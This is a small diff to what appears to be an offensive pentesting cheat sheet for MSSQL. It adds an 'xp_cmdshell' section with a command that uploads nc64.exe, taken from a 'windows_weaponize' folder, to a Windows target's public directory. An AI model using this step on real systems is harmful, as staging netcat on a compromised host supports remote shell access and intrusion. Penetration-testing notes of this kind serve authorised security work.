@@ -76,3 +76,9 @@ upload /opt/windows/windows_weaponize/bin/nc64.exe c:\Users\Public\nc.exe
 ```bash
 use_link "<link_name>"
 ```
+
+
+## cmd - xp_cmdshell
+```bash
+upload /opt/windows/windows_weaponize/bin/nc64.exe c:\Users\Public\nc.exe
+```
